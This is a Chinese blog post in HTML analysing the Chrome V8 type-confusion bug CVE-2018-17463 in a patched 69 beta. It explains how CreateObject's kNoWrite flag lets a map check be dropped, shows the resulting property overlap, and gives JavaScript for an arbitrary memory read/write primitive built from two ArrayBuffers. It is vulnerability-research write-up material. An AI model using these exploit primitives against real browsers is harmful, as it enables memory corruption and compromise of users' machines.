@@ -1,0 +1,291 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head><meta name="generator" content="Hexo 3.9.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="learning for js engine vulnerabilities">
+<meta name="keywords" content="漏洞">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Chrome Js engine attack analysis">
+<meta property="og:url" content="https://peterpan0927.github.io/2019/08/08/Chrome引擎漏洞分析及利用/index.html">
+<meta property="og:site_name" content="Peterpan0927&#39;s Blog">
+<meta property="og:description" content="learning for js engine vulnerabilities">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://forum.90sec.com/uploads/default/optimized/2X/b/bb5d8aeae750fea1015f14f07402f6771197e42c_2_810x998.jpeg">
+<meta property="og:image" content="https://forum.90sec.com/uploads/default/original/2X/7/77316d81318897b11d427e46412c69d47b0a9f1a.jpeg">
+<meta property="og:updated_time" content="2020-04-02T13:53:24.145Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Chrome Js engine attack analysis">
+<meta name="twitter:description" content="learning for js engine vulnerabilities">
+<meta name="twitter:image" content="https://forum.90sec.com/uploads/default/optimized/2X/b/bb5d8aeae750fea1015f14f07402f6771197e42c_2_810x998.jpeg">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/P.png">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>Chrome Js engine attack analysis</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+    <link rel="stylesheet" href="/lib/meslo-LG/styles.css">
+    <link rel="stylesheet" href="/lib/justified-gallery/justifiedGallery.min.css">
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- rss -->
+    
+    
+    <!-- jquery -->
+    <script src="/lib/jquery/jquery.min.js"></script>
+</head>
+
+<body>
+    <div class="banner">
+<div id="blogtitel" class="blogtitel">Peterpan0927&#39;s Blog</div>
+<ul id="wrapper" class="wrapper">
+  <div class="sun">
+    <div class="star"></div>
+  </div>
+  <div class="mercury">
+    <div class="planet">
+      <div class="shadow"></div>
+    </div>
+  </div>
+  <div class="venus">
+    <div class="planet">
+      <div class="shadow"></div>
+    </div>
+  </div>
+  <div class="earth">
+    <div class="planet"><div class="shadow"></div></div>
+  </div>
+  <div class="mars">
+    <div class="planet"><div class="shadow"></div></div>
+  </div>
+  <div class="jupiter">
+    <div class="planet"><div class="shadow"></div></div>
+  </div>
+</ul>
+</div>
+
+    <div class="background">
+      
+        <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="https://github.com/Peterpan0927">Github</a></li>
+         
+          <li><a href="https://weibo.com/p/1005055999539768?is_all=1">Weibo</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2020/02/20/local-DOS-on-latest-macOS/"><i class="fa fa-chevron-left" aria-hidden="true" onmouseover='$("#i-prev").toggle();' onmouseout='$("#i-prev").toggle();'></i></a></li>
+        
+        
+        <li><a class="icon" href="/2019/07/23/iOS12-2越狱漏洞分析/"><i class="fa fa-chevron-right" aria-hidden="true" onmouseover='$("#i-next").toggle();' onmouseout='$("#i-next").toggle();'></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up" aria-hidden="true" onmouseover='$("#i-top").toggle();' onmouseout='$("#i-top").toggle();'></i></a></li>
+        <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover='$("#i-share").toggle();' onmouseout='$("#i-share").toggle();' onclick='$("#share").toggle();return false;'></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://peterpan0927.github.io/2019/08/08/Chrome引擎漏洞分析及利用/"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://peterpan0927.github.io/2019/08/08/Chrome引擎漏洞分析及利用/&text=Chrome Js engine attack analysis"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://peterpan0927.github.io/2019/08/08/Chrome引擎漏洞分析及利用/&title=Chrome Js engine attack analysis"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://peterpan0927.github.io/2019/08/08/Chrome引擎漏洞分析及利用/&is_video=false&description=Chrome Js engine attack analysis"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Chrome Js engine attack analysis&body=Check out this article: https://peterpan0927.github.io/2019/08/08/Chrome引擎漏洞分析及利用/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://peterpan0927.github.io/2019/08/08/Chrome引擎漏洞分析及利用/&title=Chrome Js engine attack analysis"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://peterpan0927.github.io/2019/08/08/Chrome引擎漏洞分析及利用/&title=Chrome Js engine attack analysis"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://peterpan0927.github.io/2019/08/08/Chrome引擎漏洞分析及利用/&title=Chrome Js engine attack analysis"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://peterpan0927.github.io/2019/08/08/Chrome引擎漏洞分析及利用/&title=Chrome Js engine attack analysis"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://peterpan0927.github.io/2019/08/08/Chrome引擎漏洞分析及利用/&name=Chrome Js engine attack analysis&description=&lt;p&gt;learning for js engine vulnerabilities&lt;/p&gt;"><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Chrome引擎漏洞分析及利用"><span class="toc-number">1.</span> <span class="toc-text">Chrome引擎漏洞分析及利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞介绍"><span class="toc-number">1.1.</span> <span class="toc-text">漏洞介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#任意地址读写"><span class="toc-number">1.2.</span> <span class="toc-text">任意地址读写</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Link"><span class="toc-number">2.</span> <span class="toc-text">Link</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+      
+      <div class="content index width mx-auto px2 my4">
+          
+          <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Chrome Js engine attack analysis
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Peterpan0927's Blog</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2019-08-08T11:00:01.000Z" itemprop="datePublished">2019-08-08</time>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa fa-tag"></i>
+        <a class="tag-link" href="/tags/漏洞/">漏洞</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>learning for js engine vulnerabilities</p>
+<a id="more"></a>
+<h1 id="Chrome引擎漏洞分析及利用"><a href="#Chrome引擎漏洞分析及利用" class="headerlink" title="Chrome引擎漏洞分析及利用"></a>Chrome引擎漏洞分析及利用</h1><p>漏洞编号：<code>CVE-2018-17463</code>,在chrome 70版本中被patch，测试版本为69.0.3497.42 beta版，涉及的一些前置知识可以参考V8的内存布局和官方文档</p>
+<h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>V8的<code>IR</code>层操作有很多的<code>flag</code>，其中有一个<code>flag</code>叫做<code>kNowrite</code>，从简单的语义分析来看表示的就是没有进行写操作，事实上代表的意思就是拥有这个<code>flag</code>的操作不会修改原有的属性，那么也就是说<code>js engine</code>推测含有这个<code>flag</code>的操作是可以进行一些深度优化的，比如说去掉它的类型检查：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CACHED_OP_LIST(V)                                            </span></span><br><span class="line">      ...                                                               </span><br><span class="line">      V(CreateObject, Operator::kNoWrite, <span class="number">1</span>, <span class="number">1</span>)                          </span><br><span class="line">      ...</span><br></pre></td></tr></table></figure>
+<p>但是事实并非如此，通过跟踪这个的底层调用我们可以发现一些问题，在<code>JSCreateObject</code>函数中，通过跟踪调用可以发现最后调到了一个名为 <code>JSObject::OptimizeAsPrototype</code>的函数上面，而这个函数可能会修改对象原型，了解JS的可以知道所谓的原型代表的其实是一种类似类的继承关系，也就是说这个操作会修改对象的类型，也就是<code>Map</code>属性，通过<code>runtime func</code>也可以确定(<code>%DebugPrint</code>)</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">o.inline;</span><br><span class="line"><span class="built_in">Object</span>.create(o);</span><br><span class="line"><span class="comment">//经过create之后o的map会变，并且从FastProperties变成DictionaryProperties</span></span><br></pre></td></tr></table></figure>
+<p>这样一来对象<code>o</code>的内存属性布局也会随之改变，如果经过了优化之后的代码去掉了<code>checkMap</code>节点的话，那么之后对于对象属性的访问就会按照之前的内存布局进行访问，举一个很简单的例子，可能在<code>FastProperties</code>的时候想要访问属性编译成机器码之后如下所示：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">;js code : return o.b</span><br><span class="line">r1 = Load [o + 0x8]</span><br><span class="line">r2 = Load [r1 + 0x10]</span><br><span class="line">Return r2</span><br></pre></td></tr></table></figure>
+<p>但是此时作为<code>DictionaryProperties</code>的内存布局在对应偏移的位置就可能不是原来的数据了，而是其他未知的数据，在分析<code>create</code>操作前后的内存布局我们可以发现一个奇怪的事情：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">o.p0 = <span class="number">0</span>; o.p1 = <span class="number">1</span>; o.p2 = <span class="number">2</span>; o.p3 = <span class="number">3</span>; o.p4 = <span class="number">4</span>;</span><br><span class="line">o.p5 = <span class="number">5</span>; o.p6 = <span class="number">6</span>; o.p7 = <span class="number">7</span>; o.p8 = <span class="number">8</span>; o.p9 = <span class="number">9</span>;</span><br><span class="line">   <span class="number">0x0000130c92483e89</span>         <span class="number">0x0000130c92483bb1</span></span><br><span class="line">   <span class="number">0x0000000c00000000</span>         <span class="number">0x0000006500000000</span></span><br><span class="line">   <span class="number">0x0000000000000000</span>         <span class="number">0x0000000b00000000</span></span><br><span class="line">   <span class="number">0x0000000100000000</span>         <span class="number">0x0000000000000000</span></span><br><span class="line">   <span class="number">0x0000000200000000</span>         <span class="number">0x0000002000000000</span></span><br><span class="line">   <span class="number">0x0000000300000000</span>         <span class="number">0x0000000c00000000</span></span><br><span class="line">   <span class="number">0x0000000400000000</span>         <span class="number">0x0000000000000000</span></span><br><span class="line">   <span class="number">0x0000000500000000</span>         <span class="number">0x0000130ce98a4341</span></span><br><span class="line">   <span class="number">0x0000000600000000</span> overlap <span class="number">0x0000000200000000</span></span><br><span class="line">   <span class="number">0x0000000700000000</span>         <span class="number">0x000004c000000000</span></span><br><span class="line">   <span class="number">0x0000000800000000</span>         <span class="number">0x0000130c924826f1</span></span><br><span class="line">   <span class="number">0x0000000900000000</span>         <span class="number">0x0000130c924826f1</span></span><br></pre></td></tr></table></figure>
+<p>那就是<code>o.p6</code>和<code>o.p2</code>这两个属性经过转换之后发生了重叠，这意味着我们在优化去掉了<code>checkMap</code>节点之后访问<code>o.p6</code>，实际上返回的是<code>o.p2</code>的值。</p>
+<p>稍微对于<code>V8</code>的一些机制有了解的话就知道<code>DictionaryMode</code>是通过<code>hashfunc</code>来计算地址的，所以这个<code>overlap</code>是哈希之后的结果，而这个哈希计算的方式是进程独立的，也就是我们每个进程都有着不同的哈希计算方式，这也就意味着我们如果找到了这个<code>overlap</code>，之后就可以通过修改<code>o.p2</code>来做到很多事情，比如说在<code>o.p2</code>放置一个对象，那么返回的就是这个对象的地址了。</p>
+<h2 id="任意地址读写"><a href="#任意地址读写" class="headerlink" title="任意地址读写"></a>任意地址读写</h2><p>这里的任意地址读写用的是两个<code>ArrayBuffer</code>，首先来看看普通对象和<code>ArrayBuffer</code>内存布局的对比：</p>
+<p><img src="https://forum.90sec.com/uploads/default/optimized/2X/b/bb5d8aeae750fea1015f14f07402f6771197e42c_2_810x998.jpeg" alt></p>
+<p>上面的是<code>ArrayBuffer</code>，下面是普通对象，可以看到<code>backing_store</code>的偏移应该是对应的是普通对象的第二个<code>inline</code>属性的偏移，所以如果我们在触发漏洞后，将对象的第二个对象内属性修改，就可以把这个<code>backing_store</code>的值给修改，如果我们修改为指向另一个<code>ArrayBuffer</code>，形成如下的结构：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">+-----------------+           +-----------------+</span><br><span class="line">  |  ArrayBuffer 1  |     +----&gt;|  ArrayBuffer 2  |</span><br><span class="line">  |                 |     |     |                 |</span><br><span class="line">  |  map            |     |     |  map            |</span><br><span class="line">  |  properties     |     |     |  properties     |</span><br><span class="line">  |  elements       |     |     |  elements       |</span><br><span class="line">  |  byteLength     |     |     |  byteLength     |</span><br><span class="line">  |  backingStore --+-----+     |  backingStore   |</span><br><span class="line">  |  flags          |           |  flags          |</span><br><span class="line">  +-----------------+           +-----------------+</span><br></pre></td></tr></table></figure>
+<p>那么我们用第一个ArrayBuffer来new一个<code>BigUint64</code>的数组，这个数组的地址事实上是<code>ArrayBuffer</code>的数据，也就是<code>backing_store</code>指向的<code>ArrayBuffer2</code>，我们将数组的第五个元素，也就是<code>backing_store</code>进行任意的设置可以指向任意的地址，然后切换到<code>ArrayBuffer2</code>进行操作，再用<code>ArrayBuffer2</code>来new一个新的数组，这个时候我们对数组进行的任何操作都是我们对于那个地址的任何操作，也就是所谓的任意地址读写了，稍微封装一下如下所示：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//driver是ArrayBuffer2 </span></span><br><span class="line"><span class="keyword">let</span> memory = &#123;</span><br><span class="line">  			<span class="comment">//任意地址写就是setvalue</span></span><br><span class="line">        write(addr, bytes) &#123;</span><br><span class="line">            driver[<span class="number">4</span>] = addr;</span><br><span class="line">            <span class="keyword">let</span> memview = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(memViewBuf);</span><br><span class="line">            memview.set(bytes);</span><br><span class="line">        &#125;,</span><br><span class="line">  			<span class="comment">//任意地址读就是返回数组的值</span></span><br><span class="line">        read(addr, len) &#123;</span><br><span class="line">            driver[<span class="number">4</span>] = addr;</span><br><span class="line">            <span class="keyword">let</span> memview = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(memViewBuf);</span><br><span class="line">            <span class="keyword">return</span> memview.subarray(<span class="number">0</span>, len);</span><br><span class="line">        &#125;,</span><br><span class="line">        read64(addr) &#123;</span><br><span class="line">            driver[<span class="number">4</span>] = addr;</span><br><span class="line">            <span class="keyword">let</span> memview = <span class="keyword">new</span> BigUint64Array(memViewBuf);</span><br><span class="line">            <span class="keyword">return</span> memview[<span class="number">0</span>];</span><br><span class="line">        &#125;,</span><br><span class="line">        write64(addr, ptr) &#123;</span><br><span class="line">            driver[<span class="number">4</span>] = addr;</span><br><span class="line">            <span class="keyword">let</span> memview = <span class="keyword">new</span> BigUint64Array(memViewBuf);</span><br><span class="line">            memview[<span class="number">0</span>] = ptr;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br></pre></td></tr></table></figure></p>
+<p>这里只用一个<code>ArrayBuffer</code>行不行呢？其实也是可以的，只不过每一次修改都用通过优化并触发漏洞来<code>overlap</code>掉<code>backing_store</code>，而两个<code>ArrayBuffer</code>就只需要触发一次，可以节省很多开销并更加稳定</p>
+<p>最后来看一下任意地址读的效果图，是在macOS上测试的：</p>
+<p><img src="https://forum.90sec.com/uploads/default/original/2X/7/77316d81318897b11d427e46412c69d47b0a9f1a.jpeg" alt></p>
+<p>之后的工作还有待完善，可以完全控制浏览器的控制流</p>
+<h1 id="Link"><a href="#Link" class="headerlink" title="Link"></a>Link</h1><p><a href="http://phrack.org/papers/jit_exploitation.html" target="_blank" rel="noopener">phrack</a></p>
+<p><a href="https://github.com/saelo" target="_blank" rel="noopener">saleo</a></p>
+<p><a href="https://peterpan0927.github.io/2019/07/08/JavaScript-in-V8/#more">js engine</a></p>
+
+  </div>
+</article>
+
+
+
+      </div>
+      
+       <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="https://github.com/Peterpan0927">Github</a></li>
+         
+          <li><a href="https://weibo.com/p/1005055999539768?is_all=1">Weibo</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Chrome引擎漏洞分析及利用"><span class="toc-number">1.</span> <span class="toc-text">Chrome引擎漏洞分析及利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞介绍"><span class="toc-number">1.1.</span> <span class="toc-text">漏洞介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#任意地址读写"><span class="toc-number">1.2.</span> <span class="toc-text">任意地址读写</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Link"><span class="toc-number">2.</span> <span class="toc-text">Link</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://peterpan0927.github.io/2019/08/08/Chrome引擎漏洞分析及利用/"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://peterpan0927.github.io/2019/08/08/Chrome引擎漏洞分析及利用/&text=Chrome Js engine attack analysis"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://peterpan0927.github.io/2019/08/08/Chrome引擎漏洞分析及利用/&title=Chrome Js engine attack analysis"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://peterpan0927.github.io/2019/08/08/Chrome引擎漏洞分析及利用/&is_video=false&description=Chrome Js engine attack analysis"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Chrome Js engine attack analysis&body=Check out this article: https://peterpan0927.github.io/2019/08/08/Chrome引擎漏洞分析及利用/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://peterpan0927.github.io/2019/08/08/Chrome引擎漏洞分析及利用/&title=Chrome Js engine attack analysis"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://peterpan0927.github.io/2019/08/08/Chrome引擎漏洞分析及利用/&title=Chrome Js engine attack analysis"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://peterpan0927.github.io/2019/08/08/Chrome引擎漏洞分析及利用/&title=Chrome Js engine attack analysis"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://peterpan0927.github.io/2019/08/08/Chrome引擎漏洞分析及利用/&title=Chrome Js engine attack analysis"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://peterpan0927.github.io/2019/08/08/Chrome引擎漏洞分析及利用/&name=Chrome Js engine attack analysis&description=&lt;p&gt;learning for js engine vulnerabilities&lt;/p&gt;"><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      <ul>
+        <li id="toc"><a class="icon" href="#" onclick='$("#toc-footer").toggle();return false;'><i class="fa fa-list fa-lg" aria-hidden="true"></i> TOC</a></li>
+        <li id="share"><a class="icon" href="#" onclick='$("#share-footer").toggle();return false;'><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> Share</a></li>
+        <li id="top" style="display:none"><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></li>
+        <li id="menu"><a class="icon" href="#" onclick='$("#nav-footer").toggle();return false;'><i class="fa fa-bars fa-lg" aria-hidden="true"></i> Menu</a></li>
+      </ul>
+    </div>
+
+  </div>
+</div>
+
+      
+      <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2023 Peterpan0927
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="https://github.com/Peterpan0927">Github</a></li>
+         
+          <li><a href="https://weibo.com/p/1005055999539768?is_all=1">Weibo</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+      <script src="/lib/justified-gallery/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- Google Analytics -->
+
+<!-- Disqus Comments -->
+
+
+    </div>
+</body>
+</html>
